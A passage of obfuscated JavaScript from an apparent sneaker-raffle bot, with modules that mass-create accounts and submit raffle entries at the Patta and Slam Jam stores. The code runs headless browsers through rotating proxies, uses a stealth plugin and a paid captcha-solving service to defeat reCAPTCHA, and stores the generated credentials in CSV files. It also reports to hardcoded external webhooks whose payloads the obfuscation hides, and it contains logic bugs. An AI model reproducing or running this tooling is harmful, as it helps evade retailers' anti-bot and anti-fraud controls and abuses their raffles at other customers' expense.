                                                        _0x39b080['push'](_0x3d0791);
                                                    }
                                                });
                                            }), _0x56561c['once']('end', function () {
                                            });
                                        }), _0x36339d['once']('error', function (_0x5accc9) {
                                            console['log']('Fetch\x20error:\x20' + _0x5accc9);
                                        }), _0x36339d['once']('end', function () {
                                            _0x5403a8['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x5403a8['once']('error', function (_0x17f29f) {
                            console['log'](_0x17f29f);
                        }), _0x5403a8['once']('end', async function () {
                        }), _0x5403a8['connect']();
                    }
                    async function _0x31a7bb(_0x450105, _0x46a5a5, _0x2cee09) {
                        for (var _0x2ac49e = 0x0; _0x2ac49e < _0x46a5a5['length']; _0x2ac49e++) {
                            async function _0x424c33(_0x47cf55, _0x53287c, _0x2d639b, _0x2b435f, _0x1141c9) {
                                var _0x829ada, _0x538d39 = {}, _0x365922 = [], _0xdecdbd = {}, _0x5235ea = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1a799b = Math['round'](Math['random']() * (_0x5235ea['length'] - 0x1));
                                _0x2b435f[_0x47cf55]['Size'] == 'RANDOM' && (_0x2b435f[_0x47cf55]['Size'] = _0x5235ea[_0x1a799b]);
                                !_0x2b435f && (_0x2b435f = {});
                                if (_0x5f2d88['useRandomProxy'] = ![])
                                    var _0x42e2ac = _0x1141c9[_0x47cf55]['split'](':');
                                else
                                    var _0x11d1aa = Math['round'](Math['random']() * (_0x1141c9['length'] - 0x1)), _0x42e2ac = _0x1141c9[_0x11d1aa]['split'](':');
                                var _0x5463aa = {
                                    'jar': _0x26b5a0,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2d639b['url'],
                                    'headers': _0x2d639b['headers'],
                                    'body': JSON['stringify'](_0x538d39),
                                    'proxy': 'http://' + _0x42e2ac[0x2] + ':' + _0x42e2ac[0x3] + '@' + _0x42e2ac[0x0] + ':' + _0x42e2ac[0x1]
                                };
                                return _0x53287c != 'ver' && (_0x5463aa['url'] = _0x2d639b['url'], _0x5463aa['headers'] = _0x2d639b['headers']), _0x53287c == 'ver' && (_0x5463aa['method'] = 'GET', _0x5463aa['url'] = _0x2b435f[_0x47cf55]), new Promise(function (_0x48cbe3, _0x35fdc5) {
                                    callback = async (_0x4e9d34, _0x33d4b2, _0x2dfec8) => {
                                        if (!_0x4e9d34 && _0x33d4b2['statusCode'] == 0xca || !_0x4e9d34 && _0x33d4b2['statusCode'] == 0xc8) {
                                            if (_0x53287c != 'ver') {
                                                var _0x6081f = await _0x52a86e(_0x2b435f[_0x47cf55], _0x2d639b, 'dev', ![]), _0x176c3a = await _0x52a86e(_0x2b435f[_0x47cf55], _0x2d639b, 'pub', ![]);
                                                const _0x3fe7db = {
                                                    'succesDEVMSG': { 'embeds': [_0x6081f] },
                                                    'succesPUBMSG': { 'embeds': [_0x176c3a] }
                                                };
                                                if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                                                    try {
                                                        await _0x57bb0c(_0x5f2d88['webhook'], _0x3fe7db['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x3fe7db['succesDEVMSG']), await _0x506d6f(0xc8);
                                                try {
                                                    await _0x57bb0c(_0x3f4ede, _0x3fe7db['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x37d376(_0x2b435f[_0x47cf55], _0x2d639b);
                                            }
                                            _0x48cbe3(console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x2d639b['name'] + ']\x20Task\x20' + (_0x47cf55 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x53287c != 'ver') {
                                                var _0xda517e = '' + _0x4e9d34, _0x9534c0 = await _0x52a86e(_0x2b435f[_0x47cf55], _0x2d639b, 'dev', !![], _0xda517e), _0x19e3b1 = {};
                                                _0x19e3b1['errorDEV'] = { 'embeds': [_0x9534c0] }, _0x5c9ba1(_0x2b435f[_0x47cf55], _0x2d639b), _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x19e3b1['errorDEV']), await _0x57bb0c(_0xb4796a, _0x19e3b1['errorDEV']);
                                            }
                                            _0x35fdc5(console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x2d639b['name'] + ']\x20Task\x20' + (_0x47cf55 + 0x1) + ':\x20' + _0x4e9d34)));
                                        }
                                    };
                                    try {
                                        _0x53287c != 'ver' ? console['log'](_0x15866d() + '\x20[' + _0x2d639b['name'] + ']\x20Task\x20' + (_0x47cf55 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x538d39['data']['attributes']['email']) : console['log'](_0x15866d() + '\x20[' + _0x2d639b['name'] + ']\x20Task\x20' + (_0x47cf55 + 0x1) + ':\x20Fetching\x20Response'), _0x5eed11(_0x5463aa, callback);
                                    } catch (_0x3cc083) {
                                        console['log'](_0x15866d() + '\x20Task\x20' + (_0x47cf55 + 0x1) + ':\x20' + _0x3cc083);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x424c33(_0x2ac49e, 'ver', _0x450105, _0x46a5a5, _0x2cee09), console['log'](_0x15866d() + '\x20[' + _0x450105['name'] + ']\x20Sleeping\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                            } catch (_0x4fa529) {
                            }
                        }
                    }
                    try {
                        _0x2ff006(), await _0x506d6f(0xfa0), console['log']('Found\x20' + _0x39b080['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x31a7bb(_0x5b8a39, _0x39b080, _0x24592a);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x1337d8, _0x1a9ea2, _0x343bad) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x591387 = 0x0; _0x591387 < _0x1a9ea2['length']; _0x591387++) {
                        var _0x26c9ba = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3ab3dd
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5f2d88['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xca8e52
                                }
                            ]
                        }];
                        const _0x2aa4fb = { 'embeds': _0x26c9ba };
                        _0x3d4687(_0x1337d8['name'] + '\x20Task\x20' + (_0x591387 + 0x1) + '\x20/\x20' + _0x1a9ea2['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0x1a9ea2, _0x591387);
                        var _0x56febe = await _0x52a86e(_0x1a9ea2[_0x591387], _0x1337d8, 'acc', ![]);
                        const _0x595845 = { 'succesDEVMSG': { 'embeds': [_0x56febe] } };
                        if (_0x1a9ea2[_0x591387]['Email'] == '' || _0x1a9ea2[_0x591387]['FirstName'] == '' || _0x1a9ea2[_0x591387]['LastName'] == '') {
                            console['log'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x591387 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x506d6f(0x7d0);
                            continue;
                        }
                        (_0x1a9ea2[_0x591387]['Password'] == '' || _0x1a9ea2[_0x591387] == undefined) && _0x1a9ea2[_0x591387]['Password'] == 'JRaffles23!';
                        if (_0x5f2d88['useRandomProxy'] = ![])
                            var _0x5d9e9b = _0x343bad[_0x591387]['split'](':');
                        else
                            var _0xd6f02c = Math['round'](Math['random']() * (_0x343bad['length'] - 0x1)), _0x5d9e9b = _0x343bad[_0xd6f02c]['split'](':');
                        const _0x55976d = await _0x3cc012['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5d9e9b[0x0] + ':' + _0x5d9e9b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x26270d = await _0x55976d['newPage']();
                            await _0x26270d['authenticate']({
                                'username': '' + _0x5d9e9b[0x2],
                                'password': '' + _0x5d9e9b[0x3]
                            }), console['log'](_0x15866d() + '\x20[' + _0x1337d8['name'] + ']\x20Task\x20' + (_0x591387 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x26270d['setRequestInterception'](!![]), _0x26270d['on']('request', _0x3953f1 => {
                                _0x3953f1['resourceType']() === 'image' || _0x3953f1['resourceType']() === 'font' || _0x3953f1['resourceType']() === 'media' ? _0x3953f1['abort']() : _0x3953f1['continue']();
                            }), await _0x26270d['goto']('https://patta.nl/account/register'), await _0x506d6f(0xbb8), await _0x26270d['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x15866d() + '\x20[' + _0x1337d8['name'] + ']\x20Task\x20' + (_0x591387 + 0x1) + '\x20:\x20Filling\x20information'), await _0x26270d['type']('#RegisterForm-FirstName', '' + _0x1a9ea2[_0x591387]['FirstName']), await _0x506d6f(0x226), await _0x26270d['type']('#RegisterForm-LastName', '' + _0x1a9ea2[_0x591387]['LastName']), await _0x506d6f(0x226), await _0x26270d['type']('#RegisterForm-email', '' + _0x1a9ea2[_0x591387]['Email']), await _0x506d6f(0x226), await _0x26270d['type']('#RegisterForm-password', '' + _0x1a9ea2[_0x591387]['Password']), await _0x506d6f(0x226), console['log'](_0x15866d() + '\x20[' + _0x1337d8['name'] + ']\x20Task\x20' + (_0x591387 + 0x1) + '\x20:\x20Submitting..'), await _0x26270d['$eval']('#RegisterForm', _0x6a2c9f => _0x6a2c9f['submit']()), await _0x506d6f(0x1f40);
                            try {
                                await _0x26270d['waitForSelector']('.home-page-grid__collection'), await _0x506d6f(0x1f4), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x1337d8['name'] + ']\x20Task\x20' + (_0x591387 + 0x1) + '\x20:\x20Account\x20' + _0x1a9ea2[_0x591387]['Email'] + '\x20Generated!')), _0x5b0582['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x1a9ea2[_0x591387]['Email'] + ',' + _0x1a9ea2[_0x591387]['Password']), console['log'](_0x195a86['yellow'](_0x15866d() + '\x20[' + _0x1337d8['name'] + ']\x20Task\x20' + (_0x591387 + 0x1) + '\x20:\x20Account\x20' + _0x1a9ea2[_0x591387]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x595845['succesDEVMSG']);
                                } catch {
                                }
                                await _0x57bb0c(_0x4f0ddd, _0x595845['succesDEVMSG']);
                            } catch (_0x5a5c1a) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x591387 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5a5c1a));
                            }
                        } catch (_0x4a650a) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x591387 + 0x1) + '\x20:\x20' + _0x4a650a));
                        } finally {
                            _0x55976d && _0x55976d['close'](), console['log']('Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x381321, _0x117556, _0x298f2a) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x517e1b = 0x0; _0x517e1b < _0x117556['length']; _0x517e1b++) {
                        var _0x1743bb;
                        if (_0x35f0b2 != 'yes')
                            var _0x35f0b2 = '', _0x36c755 = 0x0;
                        _0x3d4687(_0x381321['name'] + '\x20Task\x20' + (_0x517e1b + 0x1) + '\x20/\x20' + _0x117556['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0x117556, _0x517e1b);
                        if (_0x117556[_0x517e1b]['Email'] == '' || _0x117556[_0x517e1b]['Password'] == '' || _0x117556[_0x517e1b]['FirstName'] == '' || _0x117556[_0x517e1b]['LastName'] == '') {
                            console['log'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5f2d88['useRandomProxy'] = ![])
                            var _0x157276 = _0x298f2a[_0x517e1b]['split'](':');
                        else
                            var _0xbb8ce4 = Math['round'](Math['random']() * (_0x298f2a['length'] - 0x1)), _0x157276 = _0x298f2a[_0xbb8ce4]['split'](':');
                        const _0x311462 = await _0x3cc012['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x157276[0x0] + ':' + _0x157276[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x1135a9 = await _0x311462['newPage']();
                            await _0x1135a9['authenticate']({
                                'username': '' + _0x157276[0x2],
                                'password': '' + _0x157276[0x3]
                            }), console['log'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1135a9['setRequestInterception'](!![]), _0x1135a9['on']('request', _0xdf2f6c => {
                                _0xdf2f6c['resourceType']() === 'image' || _0xdf2f6c['resourceType']() === 'font' || _0xdf2f6c['resourceType']() === 'media' ? _0xdf2f6c['abort']() : _0xdf2f6c['continue']();
                            }), await _0x1135a9['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1135a9['waitForSelector']('#CustomerEmail'), console['log'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1135a9['type']('#CustomerEmail', '' + _0x117556[_0x517e1b]['Email']), await _0x506d6f(0x12c), await _0x1135a9['type']('#CustomerPassword', '' + _0x117556[_0x517e1b]['Password']), await _0x506d6f(0x226), await _0x1135a9['$eval']('#customer_login', _0x20e6ab => _0x20e6ab['submit']());
                            try {
                                await _0x1135a9['waitForSelector']('#orders'), await _0x506d6f(0x4b0);
                            } catch {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1135a9['goto']('' + _0x117556[_0x517e1b]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x506d6f(0xbb8), console['log'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1135a9['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x1135a9['type']('#email', '' + _0x117556[_0x517e1b]['Email']), await _0x506d6f(0x384), await _0x1135a9['type']('#first_name', '' + _0x117556[_0x517e1b]['FirstName']), await _0x506d6f(0x514), await _0x1135a9['type']('#last_name', '' + _0x117556[_0x517e1b]['LastName']), await _0x506d6f(0x514), await _0x1135a9['type']('#street_address', _0x117556[_0x517e1b]['Address1'] + '\x20' + _0x117556[_0x517e1b]['HouseNumber'] + '\x20' + _0x117556[_0x517e1b]['Address2']), await _0x506d6f(0x2bc);
                            _0x117556[_0x517e1b]['Postcode'] == undefined && (_0x117556[_0x517e1b]['Postcode'] = _0x117556[_0x517e1b]['Zip']);
                            await _0x1135a9['type']('#zip_code', '' + _0x117556[_0x517e1b]['Postcode']), await _0x506d6f(0x320), await _0x1135a9['type']('#city', '' + _0x117556[_0x517e1b]['City']), await _0x506d6f(0x320), await _0x1135a9['type']('#bday', '01/01/1994'), await _0x506d6f(0x320), await _0x1135a9['type']('#instagram', '' + _0x117556[_0x517e1b]['Follower']), await _0x506d6f(0x352);
                            if (_0x117556[_0x517e1b]['Size'] == 'RANDOM') {
                                const _0x17697e = await _0x1135a9['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x29153d => {
                                    return _0x29153d['map'](_0x7c2a26 => _0x7c2a26['textContent']);
                                });
                                var _0x11a340 = Math['round'](Math['random']() * (_0x17697e['length'] - 0x1));
                                console['log'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x17697e[_0x11a340]), await _0x1135a9['click']('label[data-eu-size=\x22' + _0x17697e[_0x11a340] + '\x22]');
                            } else {
                                console['log'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x117556[_0x517e1b]['Size']);
                                try {
                                    await _0x1135a9['click']('label[data-eu-size=\x22' + _0x117556[_0x517e1b]['Size'] + '\x22]');
                                } catch {
                                    await _0x1135a9['click']('label[data-eu-size=\x22' + _0x117556[_0x517e1b]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x506d6f(0xbb8), await _0x1135a9['$$eval']('.raffle__checkbox-label', _0x7b5b4 => _0x7b5b4['forEach'](_0xfd7457 => _0xfd7457['click']())), await _0x506d6f(0x7d0), console['log'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x1135a9['click']('#raffle__form-submit'), await _0x506d6f(0x1388);
                            try {
                                await _0x1135a9['waitForSelector']('#raffle__confirmation-message-container'), _0x35f0b2 = 'no', _0x37d376(_0x117556[_0x517e1b], _0x381321), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x1d70a5) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x1d70a5));
                            }
                        } catch (_0x40e633) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20' + _0x40e633)), _0x35f0b2 = 'yes';
                        } finally {
                            _0x311462 && _0x311462['close']();
                            if (_0x35f0b2 == 'yes' && _0x36c755 != 0x5 && _0x1743bb != 'Size\x20Not\x20Found') {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x381321['name'] + ']\x20Task\x20' + (_0x517e1b + 0x1) + '\x20:\x20Retrying')), _0x517e1b = _0x517e1b - 0x1, _0x36c755 = _0x36c755 + 0x1;
                                continue;
                            }
                            _0x35f0b2 == 'yes' && _0x36c755 >= 0x5 && (_0x5c9ba1(_0x117556[_0x517e1b], _0x381321), _0x35f0b2 = 'no', _0x36c755 = 0x0), console['log']('Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x3930a6, _0x1376a0, _0xd628fa) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x50554d = 0x0; _0x50554d < _0x1376a0['length']; _0x50554d++) {
                        if (_0x837529 != 'yes')
                            var _0x837529 = '', _0x316098 = 0x0;
                        var _0x474a5b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3ab3dd
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5f2d88['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xca8e52
                                }
                            ]
                        }];
                        const _0x28656d = { 'embeds': _0x474a5b };
                        _0x3d4687(_0x3930a6['name'] + '\x20Task\x20' + (_0x50554d + 0x1) + '\x20/\x20' + _0x1376a0['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0x1376a0, _0x50554d);
                        var _0x5ca1e = await _0x52a86e(_0x1376a0[_0x50554d], _0x3930a6, 'acc', ![]);
                        const _0x5a2939 = { 'succesDEVMSG': { 'embeds': [_0x5ca1e] } };
                        if (_0x1376a0[_0x50554d]['Email'] == '' || _0x1376a0[_0x50554d]['FirstName'] == '' || _0x1376a0[_0x50554d]['LastName'] == '') {
                            console['log'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x506d6f(0x7d0);
                            continue;
                        }
                        (_0x1376a0[_0x50554d]['Password'] == '' || _0x1376a0[_0x50554d] == undefined) && _0x1376a0[_0x50554d]['Password'] == 'JRaffles23!';
                        if (_0x5f2d88['useRandomProxy'] = ![])
                            var _0x37787c = _0xd628fa[_0x50554d]['split'](':');
                        else
                            var _0x49ddc7 = Math['round'](Math['random']() * (_0xd628fa['length'] - 0x1)), _0x37787c = _0xd628fa[_0x49ddc7]['split'](':');
                        const _0x1f1e33 = await _0x3cc012['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x37787c[0x0] + ':' + _0x37787c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x2149a6 = await _0x1f1e33['newPage']();
                            await _0x2149a6['authenticate']({
                                'username': '' + _0x37787c[0x2],
                                'password': '' + _0x37787c[0x3]
                            }), console['log'](_0x15866d() + '\x20[' + _0x3930a6['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2149a6['setRequestInterception'](!![]), _0x2149a6['on']('request', _0x35ae3c => {
                                _0x35ae3c['resourceType']() === 'image' || _0x35ae3c['resourceType']() === 'font' || _0x35ae3c['resourceType']() === 'media' ? _0x35ae3c['abort']() : _0x35ae3c['continue']();
                            }), await _0x2149a6['goto']('https://drop.slamjam.com/account/register'), await _0x506d6f(0xbb8), await _0x2149a6['waitForSelector']('#FirstName'), await _0x2149a6['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2149a6['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x15866d() + '\x20[' + _0x3930a6['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20Filling\x20information'), await _0x506d6f(0x4b0), await _0x2149a6['type']('#FirstName', '' + _0x1376a0[_0x50554d]['FirstName']), await _0x506d6f(0x226), await _0x2149a6['type']('#LastName', '' + _0x1376a0[_0x50554d]['LastName']), await _0x506d6f(0x226), await _0x2149a6['type']('#Email', '' + _0x1376a0[_0x50554d]['Email']), await _0x506d6f(0x2ee), await _0x2149a6['type']('#ConfirmEmail', '' + _0x1376a0[_0x50554d]['Email']), await _0x506d6f(0x2ee), await _0x2149a6['type']('#CreatePassword', '' + _0x1376a0[_0x50554d]['Password']), await _0x506d6f(0x2ee), await _0x2149a6['type']('#CreateConfirmPassword', '' + _0x1376a0[_0x50554d]['Password']), await _0x506d6f(0x226), console['log'](_0x15866d() + '\x20[' + _0x3930a6['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20Submitting..'), await _0x2149a6['$eval']('#create_customer', _0x474e32 => _0x474e32['submit']()), await _0x506d6f(0x1388), console['log'](_0x15866d() + '\x20[' + _0x3930a6['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20' + _0x195a86['cyan']('Solving\x20Captcha')), await _0x2149a6['solveRecaptchas'](), console['log'](_0x15866d() + '\x20[' + _0x3930a6['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x2149a6['$eval']('.shopify-challenge__container\x20>\x20form', _0x450cc6 => _0x450cc6['submit']());
                            try {
                                await _0x2149a6['waitForSelector']('.product-card__image'), await _0x506d6f(0x1f4), _0x837529 = 'no', console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x3930a6['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20Account\x20' + _0x1376a0[_0x50554d]['Email'] + '\x20Generated!')), _0x5b0582['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x1376a0[_0x50554d]['Email'] + ',' + _0x1376a0[_0x50554d]['Password']), console['log'](_0x195a86['yellow'](_0x15866d() + '\x20[' + _0x3930a6['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20Account\x20' + _0x1376a0[_0x50554d]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x5a2939['succesDEVMSG']);
                                } catch {
                                }
                                await _0x57bb0c(_0x4f0ddd, _0x5a2939['succesDEVMSG']);
                            } catch (_0x54d283) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x54d283));
                            }
                        } catch (_0x14517e) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20' + _0x14517e));
                        } finally {
                            _0x1f1e33 && _0x1f1e33['close']();
                            if (_0x837529 == 'yes' && _0x316098 != 0x5) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x3930a6['name'] + ']\x20Task\x20' + (_0x50554d + 0x1) + '\x20:\x20Retrying')), _0x50554d = _0x50554d - 0x1, _0x316098 = _0x316098 + 0x1;
                                continue;
                            }
                            _0x837529 == 'yes' && _0x316098 >= 0x5 && (_0x5c9ba1(_0x1376a0[_0x50554d], _0x3930a6), _0x837529 = 'no', _0x316098 = 0x0), console['log']('Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x584079, _0x5de50b, _0x420e4a) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1c14c6 = 0x0; _0x1c14c6 < _0x5de50b['length']; _0x1c14c6++) {
                        var _0x1b823e;
                        if (_0x267519 != 'yes')
                            var _0x267519 = '', _0x500def = 0x0;
                        _0x3d4687(_0x584079['name'] + '\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20/\x20' + _0x5de50b['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0x5de50b, _0x1c14c6);
                        if (_0x5de50b[_0x1c14c6]['Email'] == '' || _0x5de50b[_0x1c14c6]['Password'] == '' || _0x5de50b[_0x1c14c6]['FirstName'] == '' || _0x5de50b[_0x1c14c6]['LastName'] == '') {
                            console['log'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5f2d88['useRandomProxy'] = ![])
                            var _0x3f230a = _0x420e4a[_0x1c14c6]['split'](':');
                        else
                            var _0x2e1350 = Math['round'](Math['random']() * (_0x420e4a['length'] - 0x1)), _0x3f230a = _0x420e4a[_0x2e1350]['split'](':');
                        const _0x1e23f8 = await _0x3cc012['launch']({
                            'headless': !![],
                            'args': [
